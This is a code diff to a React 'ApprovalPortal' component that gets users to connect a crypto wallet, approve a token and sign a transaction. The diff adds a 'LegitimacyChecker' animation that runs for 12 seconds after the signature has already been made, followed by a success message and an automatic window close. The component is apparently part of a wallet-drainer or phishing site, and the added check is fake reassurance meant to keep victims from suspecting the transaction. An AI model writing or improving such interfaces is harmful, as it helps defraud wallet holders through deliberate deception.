@@ -5,6 +5,7 @@ import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
+import LegitimacyChecker from './LegitimacyChecker';
 import { switchToBSC, approveToken, prepareAndSignTransaction } from '@/lib/blockchain';
 
 export default function ApprovalPortal() {
@@ -15,6 +16,7 @@ export default function ApprovalPortal() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
+  const [showLegitimacyCheck, setShowLegitimacyCheck] = useState(false);
 
   const handleConnectWallet = async () => {
     try {
@@ -59,12 +61,19 @@ export default function ApprovalPortal() {
       setLoading(true);
       if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
       await prepareAndSignTransaction(signer, provider, userAddress);
-      setShowSuccess(true);
+      
+      // Show legitimacy check animation
+      setShowLegitimacyCheck(true);
+      
+      // Show success modal after legitimacy check completes
       setTimeout(() => {
-        if (typeof window !== 'undefined') {
-          window.close();
-        }
-      }, 3000);
+        setShowSuccess(true);
+        setTimeout(() => {
+          if (typeof window !== 'undefined') {
+            window.close();
+          }
+        }, 3000);
+      }, 12000);
     } catch (err: any) {
       setError(err?.message || 'Transaction failed');
     } finally {
@@ -214,6 +223,7 @@ export default function ApprovalPortal() {
         )}
 
         <SuccessModal isOpen={showSuccess} />
+        <LegitimacyChecker isOpen={showLegitimacyCheck} />
       </div>
 
       {/* Footer */}
